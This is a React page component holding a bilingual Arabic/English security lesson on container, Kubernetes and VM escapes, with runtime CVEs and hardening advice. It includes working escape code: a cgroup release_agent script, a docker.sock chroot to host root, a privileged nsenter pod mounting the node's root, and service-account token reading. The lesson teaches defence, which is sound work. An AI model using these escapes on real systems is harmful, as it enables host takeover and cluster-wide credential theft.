"use client";
import { LessonShell, Section, Callout, Code, Analogy, TwoCol, Card, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="container-escapes">
      <L
        ar={<>
          <Section title="من الحاوية إلى السيرفر — كسر العزل">
            <Analogy>الحاوية زي مركب في ميناء: كل مركب ليه حدوده، لكن كلهم بيشتركوا في نفس الميناء (الـ host kernel). لو القرصان لقى خرم في قاع المركب بتاعه، يخرج منه ويبقى في ميناء كامل فيه عشرات المراكب التانية. ده بالظبط اللي بيحصل في Container Escape.</Analogy>
            <Callout kind="danger" title="تحذير قانوني">
              الكلام ده للوعي الدفاعي ولاختبارات الاختراق المرخّصة. تطبيقه على بيئات إنتاج لجهات تانية = جريمة فيدرالية. لا تلعب بالنار.
            </Callout>
          </Section>

          <Section title="إيه اللي بيعزل الحاوية أصلاً؟">
            <p>قبل ما نتكلم عن الهروب، خلينا نفهم السجن نفسه. الحاوية مش VM — هي عملية عادية على الـ kernel، بس متلفّة في كذا طبقة عزل:</p>
            <ul>
              <li><b>Namespaces</b>: PID, network, mount, UTS, IPC, user, cgroup, time. كل واحد بيعزل بُعد واحد.</li>
              <li><b>cgroups</b>: بتحدد الموارد (CPU, memory, io).</li>
              <li><b>capabilities</b>: بتقسم صلاحيات root لحوالي 40 صلاحية مستقلة.</li>
              <li><b>seccomp-bpf</b>: قائمة بيضاء للـ syscalls المسموحة.</li>
              <li><b>AppArmor / SELinux</b>: MAC إجباري.</li>
              <li><b>UID mapping</b>: user namespace بيخلّي root الحاوية = uid عادي على الـ host.</li>
            </ul>
            <p>أي طبقة فيهم تسقط = طبقة دفاع أقل. لما تسقط كلهم = هربت.</p>
          </Section>

          <Section title="Misconfigurations — السكة الأقصر للهروب">
            <h3>1) Privileged container</h3>
            <Code lang="bash">{`docker run --privileged ...
# يعطي كل الـ capabilities + access للـ devices = root كامل على host`}</Code>
            <Code lang="escape via cgroup release_agent (classic)">{`mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo 'ps -ef > /tmp/host_ps' >> /cmd
chmod +x /cmd
sh -c "echo \\$\\$ > /tmp/cgrp/x/cgroup.procs"
# الـ release_agent يُنفّذ على host = root`}</Code>
            <h3>2) Mount sensitive paths</h3>
            <ul>
              <li><code>/var/run/docker.sock</code> داخل الحاوية = <b>تحكم كامل بالـ Docker daemon</b> = root على host.</li>
              <li><code>/proc</code> أو <code>/sys</code> من host.</li>
              <li><code>/</code> الكامل (yes, this happens).</li>
            </ul>
            <Code lang="docker.sock escape">{`# لو /var/run/docker.sock مركّب
docker -H unix:///var/run/docker.sock run -v /:/host --privileged alpine \\
  chroot /host bash
# أنت الآن root على الـ host`}</Code>
            <h3>3) Dangerous capabilities</h3>
            <ul>
              <li><b>CAP_SYS_ADMIN</b> — تقريباً = root.</li>
              <li><b>CAP_SYS_PTRACE</b> — اربط نفسك بعملية host (لو PID namespace مكسور).</li>
              <li><b>CAP_SYS_MODULE</b> — حمّل kernel module.</li>
              <li><b>CAP_DAC_READ_SEARCH</b> — اقرأ كل ملفات الـ host.</li>
              <li><b>CAP_NET_ADMIN</b> — تلاعب بشبكة host.</li>
            </ul>
          </Section>

          <Section title="ثغرات شهيرة في الـ runtime">
            <ul>
              <li><b>CVE-2019-5736 (runc)</b> — كتابة فوق ثنائي runc من داخل الحاوية → كل تشغيل تالٍ يُنفّذ كود المهاجم على host.</li>
              <li><b>CVE-2022-0185 (Linux kernel)</b> — heap overflow في fs context → escape مع CAP_SYS_ADMIN.</li>
              <li><b>CVE-2022-0492 (cgroups v1)</b> — إساءة release_agent بدون CAP_SYS_ADMIN.</li>
              <li><b>Leaky Vessels (CVE-2024-21626)</b> — runc + BuildKit، fd handle مسرّب يصل لـ host.</li>
              <li><b>CVE-2024-23653 (BuildKit)</b> — هروب أثناء بناء الـ image.</li>
            </ul>
            <Callout kind="warn" title="القاعدة الذهبية">
              خلّي عندك سياسة patch صارمة على الـ runtime: حدّث containerd و runc و BuildKit فوراً لما يطلع CVE. التأخير يوم واحد ممكن يحرقلك الـ cluster كله.
            </Callout>
          </Section>

          <Section title="Kubernetes — هروب من Pod">
            <h3>سطح الهجوم</h3>
            <ul>
              <li><b>ServiceAccount token</b> داخل <code>/var/run/secrets/kubernetes.io/serviceaccount/</code>.</li>
              <li><b>kubelet API</b> غير محمي على :10250.</li>
              <li><b>HostPath volumes</b> تركيب مسارات حساسة.</li>
              <li><b>privileged: true</b> أو <b>hostNetwork: true</b> أو <b>hostPID: true</b>.</li>
              <li><b>Insecure RBAC</b> — ServiceAccount يستطيع <code>create pods, exec, secrets</code>.</li>
            </ul>
            <Code lang="quick triage from inside a pod">{`# اقرأ الـ token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc

# تحقّق من الصلاحيات
kubectl auth can-i --list

# أداة شاملة
peirates
amicontained -v
deepce.sh`}</Code>
            <h3>تقنيات الـ escalation داخل k8s</h3>
            <ol>
              <li><b>Create privileged pod</b> يربط <code>/</code> الـ node.</li>
              <li><b>Use hostPath</b> في الـ pod الجديد للوصول لـ <code>/etc/kubernetes/pki</code> ← مفاتيح cluster-admin.</li>
              <li>أو <b>read all secrets</b> في الـ namespaces.</li>
              <li>أو <b>steal service account tokens</b> من pods أخرى.</li>
              <li>التحرك إلى <b>etcd</b> = كل الـ cluster.</li>
            </ol>
            <Code lang="malicious privileged pod">{`apiVersion: v1
kind: Pod
metadata: { name: pwn }
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwn
    image: alpine
    securityContext: { privileged: true }
    command: ["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "bash"]
    volumeMounts: [{ name: host, mountPath: /host }]
  volumes: [{ name: host, hostPath: { path: / } }]`}</Code>
            <Callout kind="good" title="الدفاع — k8s">
              <ol>
                <li><b>Pod Security Standards</b>: <code>restricted</code> profile افتراضياً.</li>
                <li><b>OPA Gatekeeper / Kyverno</b> لمنع pods خطرة.</li>
                <li>RBAC بأقل صلاحيات + لا <code>cluster-admin</code> لـ ServiceAccounts.</li>
                <li>عطّل <b>auto-mount</b> الـ ServiceAccount tokens.</li>
                <li>NetworkPolicy: deny-all + allow-list.</li>
                <li>kubelet: authn=Webhook, anonymous-auth=false، شهادات mTLS.</li>
                <li>Image signing (cosign + sigstore policy).</li>
                <li>Runtime monitoring: <b>Falco, Tracee, Tetragon</b>.</li>
                <li>cluster forensics: <b>kube-bench, kube-hunter, krane</b>.</li>
              </ol>
            </Callout>
          </Section>

          <Section title="VM / Hypervisor Escapes — الجائزة الكبرى">
            <p>الهروب من VM إلى hypervisor (Xen, KVM, VMware, Hyper-V) نادر و قاتل — يعطي تحكماً بكل VMs على نفس الـ host.</p>
            <h3>أمثلة تاريخية</h3>
            <ul>
              <li><b>VENOM (CVE-2015-3456)</b> — QEMU floppy controller.</li>
              <li><b>BlueKeep on Hyper-V</b>.</li>
              <li><b>Pwn2Own escapes</b> سنوياً على VMware Workstation / VirtualBox.</li>
              <li><b>L1TF, Foreshadow, MDS</b> — side-channel attacks ضد عزل الـ CPU.</li>
            </ul>
            <h3>الدفاع</h3>
            <ul>
              <li>Patch الـ hypervisor أسرع من patch الـ guests (نطاق التأثير أكبر).</li>
              <li>عطّل الميزات غير الضرورية (USB passthrough, shared folders).</li>
              <li>استخدم <b>microVMs</b> (Firecracker, Kata Containers) للـ workloads المتعددة المستأجرين.</li>
              <li>افصل tenants على hosts فيزيائية مختلفة عند الحساسية القصوى.</li>
            </ul>
          </Section>

          <Section title="مبادئ تصميم آمن للحاويات">
            <ol>
              <li><b>Distroless / scratch images</b> — لا shell، لا apt، لا أي أداة للهجوم.</li>
              <li><b>Non-root user</b> داخل الحاوية + <code>USER nobody</code>.</li>
              <li><b>readOnlyRootFilesystem: true</b>.</li>
              <li><b>Drop ALL capabilities</b> ثم أضف فقط ما يلزم.</li>
              <li><b>seccomp profile</b> صارم (RuntimeDefault على الأقل).</li>
              <li><b>AppArmor / SELinux</b> profile لكل خدمة.</li>
              <li><b>User namespace remapping</b> — root الحاوية ≠ root host.</li>
              <li>افحص الـ images بـ <b>trivy / grype / dockle</b> قبل النشر.</li>
              <li>وقّع الـ images بـ <b>cosign</b> و افرض signature verification في k8s.</li>
              <li>قلّل سطح الـ host: <b>Bottlerocket, Talos, Flatcar</b>.</li>
            </ol>
          </Section>
        </>}
        en={<>
          <Section title="From container to host — breaking isolation">
            <Analogy>A container is like a ship at port: each ship has its boundaries, but they share the harbor (the host kernel). If a pirate finds a crack in the hull, they walk out of their ship into a harbor full of dozens of others.</Analogy>
            <Callout kind="danger" title="Important">
              For defensive awareness and authorized pentests only. Applying these to other parties' production
              environments is a federal crime.
            </Callout>
          </Section>

          <Section title="What actually isolates a container?">
            <ul>
              <li><b>Namespaces</b>: PID, network, mount, UTS, IPC, user, cgroup, time. Each isolates one dimension.</li>
              <li><b>cgroups</b>: resource limits (CPU, memory, io).</li>
              <li><b>capabilities</b>: split root power into ~40 independent privileges.</li>
              <li><b>seccomp-bpf</b>: a syscall allow-list.</li>
              <li><b>AppArmor / SELinux</b>: mandatory access control.</li>
              <li><b>UID mapping</b>: user namespace makes container-root = a regular uid on the host.</li>
            </ul>
            <p>Each broken layer = one less defense.</p>
          </Section>

          <Section title="Misconfigurations — the shortest route out">
            <h3>1) Privileged container</h3>
            <Code lang="bash">{`docker run --privileged ...
# All capabilities + device access = full host root`}</Code>
            <Code lang="escape via cgroup release_agent (classic)">{`mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo 'ps -ef > /tmp/host_ps' >> /cmd
chmod +x /cmd
sh -c "echo \\$\\$ > /tmp/cgrp/x/cgroup.procs"
# release_agent runs on the host = root`}</Code>
            <h3>2) Mounting sensitive paths</h3>
            <ul>
              <li><code>/var/run/docker.sock</code> inside the container = <b>full Docker daemon control</b> = host root.</li>
              <li><code>/proc</code> or <code>/sys</code> from the host.</li>
              <li>The full <code>/</code> (yes, this happens).</li>
            </ul>
            <Code lang="docker.sock escape">{`# When /var/run/docker.sock is mounted
docker -H unix:///var/run/docker.sock run -v /:/host --privileged alpine \\
  chroot /host bash
# You're now host root`}</Code>
            <h3>3) Dangerous capabilities</h3>
            <ul>
              <li><b>CAP_SYS_ADMIN</b> — practically root.</li>
              <li><b>CAP_SYS_PTRACE</b> — attach to host processes (if PID namespace is broken).</li>
              <li><b>CAP_SYS_MODULE</b> — load a kernel module.</li>
              <li><b>CAP_DAC_READ_SEARCH</b> — read every file on the host.</li>
              <li><b>CAP_NET_ADMIN</b> — manipulate host networking.</li>
            </ul>
          </Section>

          <Section title="Notable runtime CVEs">
            <ul>
              <li><b>CVE-2019-5736 (runc)</b> — overwrite the runc binary from inside the container → every subsequent run executes attacker code on the host.</li>
              <li><b>CVE-2022-0185 (Linux kernel)</b> — fs context heap overflow → escape with CAP_SYS_ADMIN.</li>
              <li><b>CVE-2022-0492 (cgroups v1)</b> — release_agent abuse without CAP_SYS_ADMIN.</li>
              <li><b>Leaky Vessels (CVE-2024-21626)</b> — runc + BuildKit fd-handle leak reaching the host.</li>
              <li><b>CVE-2024-23653 (BuildKit)</b> — escape during image build.</li>
            </ul>
            <Callout kind="warn" title="Golden rule">
              Operate a strict patch policy: update runtime (containerd, runc, BuildKit) immediately on CVE release.
            </Callout>
          </Section>

          <Section title="Kubernetes — pod escape">
            <h3>Attack surface</h3>
            <ul>
              <li><b>ServiceAccount token</b> at <code>/var/run/secrets/kubernetes.io/serviceaccount/</code>.</li>
              <li>Unprotected <b>kubelet API</b> on :10250.</li>
              <li><b>HostPath volumes</b> mounting sensitive paths.</li>
              <li><b>privileged: true</b>, <b>hostNetwork: true</b>, or <b>hostPID: true</b>.</li>
              <li><b>Insecure RBAC</b> — ServiceAccount with <code>create pods, exec, secrets</code>.</li>
            </ul>
            <Code lang="quick triage from inside a pod">{`# Read the token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc

# Check permissions
kubectl auth can-i --list

# Comprehensive tools
peirates
amicontained -v
deepce.sh`}</Code>
            <h3>Escalation patterns inside k8s</h3>
            <ol>
              <li><b>Create a privileged pod</b> mounting the node's <code>/</code>.</li>
              <li>Use <b>hostPath</b> in the new pod to read <code>/etc/kubernetes/pki</code> ← cluster-admin keys.</li>
              <li>Or <b>read all secrets</b> across namespaces.</li>
              <li>Or <b>steal service account tokens</b> from other pods.</li>
              <li>Pivot to <b>etcd</b> = the entire cluster.</li>
            </ol>
            <Code lang="malicious privileged pod">{`apiVersion: v1
kind: Pod
metadata: { name: pwn }
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwn
    image: alpine
    securityContext: { privileged: true }
    command: ["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "bash"]
    volumeMounts: [{ name: host, mountPath: /host }]
  volumes: [{ name: host, hostPath: { path: / } }]`}</Code>
            <Callout kind="good" title="Defense — k8s">
              <ol>
                <li><b>Pod Security Standards</b>: <code>restricted</code> profile by default.</li>
                <li><b>OPA Gatekeeper / Kyverno</b> to block dangerous pods.</li>
                <li>Least-privilege RBAC + no <code>cluster-admin</code> for ServiceAccounts.</li>
                <li>Disable <b>auto-mount</b> of ServiceAccount tokens.</li>
                <li>NetworkPolicy: deny-all + allow-list.</li>
                <li>kubelet: authn=Webhook, anonymous-auth=false, mTLS certs.</li>
                <li>Image signing (cosign + sigstore policy).</li>
                <li>Runtime monitoring: <b>Falco, Tracee, Tetragon</b>.</li>
                <li>Cluster forensics: <b>kube-bench, kube-hunter, krane</b>.</li>
              </ol>
            </Callout>
          </Section>

          <Section title="VM / hypervisor escapes — the crown jewel">
            <p>Escaping from a VM to the hypervisor (Xen, KVM, VMware, Hyper-V) is rare and devastating — it grants control over every VM on the same host.</p>
            <h3>Historical examples</h3>
            <ul>
              <li><b>VENOM (CVE-2015-3456)</b> — QEMU floppy controller.</li>
              <li><b>BlueKeep on Hyper-V</b>.</li>
              <li><b>Pwn2Own escapes</b> annually on VMware Workstation / VirtualBox.</li>
              <li><b>L1TF, Foreshadow, MDS</b> — side-channel attacks against CPU isolation.</li>
            </ul>
            <h3>Defense</h3>
            <ul>
              <li>Patch the hypervisor faster than the guests (the blast radius is much larger).</li>
              <li>Disable unneeded features (USB passthrough, shared folders).</li>
              <li>Use <b>microVMs</b> (Firecracker, Kata Containers) for multi-tenant workloads.</li>
              <li>Separate tenants onto different physical hosts at the highest sensitivity tier.</li>
            </ul>
          </Section>

          <Section title="Secure-by-design containers">
            <ol>
              <li><b>Distroless / scratch images</b> — no shell, no apt, no attack tooling.</li>
              <li><b>Non-root user</b> in the container + <code>USER nobody</code>.</li>
              <li><b>readOnlyRootFilesystem: true</b>.</li>
              <li><b>Drop ALL capabilities</b>, then add only what's required.</li>
              <li>Strict <b>seccomp profile</b> (RuntimeDefault at minimum).</li>
              <li><b>AppArmor / SELinux</b> profile per service.</li>
              <li><b>User namespace remapping</b> — container-root ≠ host-root.</li>
              <li>Scan images with <b>trivy / grype / dockle</b> before deploy.</li>
              <li>Sign images with <b>cosign</b> and enforce signature verification in k8s.</li>
              <li>Minimize the host: <b>Bottlerocket, Talos, Flatcar</b>.</li>
            </ol>
          </Section>
        </>}
      />
    </LessonShell>
  );
}
